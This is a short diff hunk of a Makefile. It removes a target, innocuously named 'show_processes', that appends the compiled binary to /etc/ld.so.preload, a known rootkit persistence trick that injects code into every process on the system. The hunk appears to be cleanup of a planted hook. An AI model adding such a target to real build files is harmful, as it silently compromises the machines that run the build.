@@ -8,6 +8,3 @@ all: $(TARGET)
 $(TARGET):$(SRCS)
 
         $(CC) $(CFLAGS) -o $(TARGET) $(SRCS)
-
-show_processes:
-	echo "$(PWD)/$(TARGET)" >> /etc/ld.so.preload
